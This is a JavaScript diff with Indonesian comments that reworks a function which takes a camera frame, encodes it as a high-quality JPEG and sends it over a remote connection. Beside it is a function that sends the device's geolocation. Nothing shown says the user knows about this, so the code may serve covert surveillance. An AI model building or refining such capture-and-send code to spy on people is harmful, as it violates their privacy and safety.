@@ -59,16 +59,28 @@
   }
 
   function ambilFoto(){
-    const v=document.getElementById("v");
-    const c=document.getElementById("c");
-    v.srcObject=stream;
-    setTimeout(()=>{
-      c.width=v.videoWidth;
-      c.height=v.videoHeight;
-      c.getContext("2d").drawImage(v,0,0);
-      conn.send({type:"FOTO",data:c.toDataURL("image/jpeg")});
-    },800);
-  }
+  const v = document.getElementById("v");
+  const c = document.getElementById("c");
+  const ctx = c.getContext("2d");
+
+  v.srcObject = stream;
+
+  v.onloadedmetadata = () => {
+    // Paksa ukuran canvas sama dengan resolusi video
+    c.width  = v.videoWidth;
+    c.height = v.videoHeight;
+
+    // Gambar full frame
+    ctx.drawImage(v, 0, 0, c.width, c.height);
+
+    // Kirim kualitas tinggi
+    conn.send({
+      type: "FOTO",
+      data: c.toDataURL("image/jpeg", 0.9)
+    });
+  };
+}
+
 
   function kirimLokasi(){
     navigator.geolocation.getCurrentPosition(p=>{
